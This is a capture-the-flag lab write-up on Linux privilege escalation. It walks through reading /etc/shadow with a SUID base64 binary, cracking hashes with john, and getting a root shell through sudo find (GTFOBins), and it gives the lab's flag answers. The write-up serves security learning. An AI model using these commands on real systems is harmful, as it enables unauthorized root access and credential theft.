# Linux Privilege Escalation – Capstone Lab Writeup

## Challenge Overview

In this Linux privilege escalation challenge, we were provided with SSH credentials for an initial user. From there, the goal was to enumerate the system, escalate privileges using misconfigured permissions, and capture two flags located in different user and root-owned directories.

---

## FLAG 1 – Gaining Access and Enumerating Privileges

**Initial Access:**

- Logged in via SSH using the provided credentials for user `leonard`.

**Enumeration Performed:**

```bash
whoami
sudo -l
uname -a
find / -type f -perm -04000 2>/dev/null
```

![2025-04-30_14-41](https://github.com/user-attachments/assets/bd852660-cfc6-4558-a69f-55c2eab6f195)
![2025-04-30_14-42](https://github.com/user-attachments/assets/ba8f03c8-3e98-4f55-a772-e3f116c34b8a)
![base64](https://github.com/user-attachments/assets/1b37e96b-fcf6-4d71-93f4-851edfe5a839)


**Findings:**
- User `leonard` cannot use `sudo`.
- Kernel version: `3.10`
- SUID binary discovered: `/usr/bin/base64`

**Exploitation via SUID `base64`:**

```bash
export shadows="/etc/shadow"
base64 $shadows | base64 -d
```

![2025-04-30_14-48](https://github.com/user-attachments/assets/ad7730a0-4354-47f8-ae6f-753872cbdebb)
![2025-04-30_14-48_1](https://github.com/user-attachments/assets/824edc8b-f924-4ec9-b7ca-7866f0019fee)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt missy.txt
```

![2025-04-30_14-53](https://github.com/user-attachments/assets/1cc33718-52b5-400a-9af1-f06c72001bac)

- Extracted and cracked password hashes for users `missy`, `leonard`, and `root`.
- Used `john` with `rockyou.txt` to crack the hash for user `missy`.
- Password discovered: `Password1`

**Escalated to user `missy`** via SSH.

**Sudo permissions:**

```bash
sudo -l
```

![2025-04-30_14-55](https://github.com/user-attachments/assets/ff1f83b8-3fde-4b63-bb8a-6f179b26fd55)


- Result: User `missy` can execute `find` as root.

**Locate first flag:**

```bash
find / -type f -name flag1.txt 2>/dev/null
```

- Result: `/home/missy/Documents/flag1.txt`

![flag1](https://github.com/user-attachments/assets/029a690b-151d-4c79-8fa2-a97d30015478)

**Flag 1 obtained.**

Flag 1: `THM-42828719920544`

---

## FLAG 2 – Privilege Escalation to Root

With access as user `missy` and the ability to run `find` with `sudo`, I leveraged a known GTFOBins trick:

```bash
sudo find . -exec /bin/sh -p \; -quit
```

- Result: Spawned a root shell.

![2025-04-30_17-46](https://github.com/user-attachments/assets/1394ae60-87f2-4a7c-8d18-bd4c7af5f74f)

**Navigated to rootflag directory and retrieved second flag:**

```bash
cd ../rootflag
cat flag2.txt
```

![2025-04-30_17-47](https://github.com/user-attachments/assets/362d567d-63cd-4b4c-bfc9-a908f3f049ad)

**Flag 2 obtained.**

Flag 2: `THM-168824782390238`

---

## Conclusion

This challenge demonstrated practical Linux privilege escalation concepts including:

- Abuse of SUID binaries to read sensitive files
- Cracking password hashes using `john`
- Using `sudo` misconfigurations with `find` for root access

It’s a strong reminder of why system hardening and privilege boundaries are critical for security.

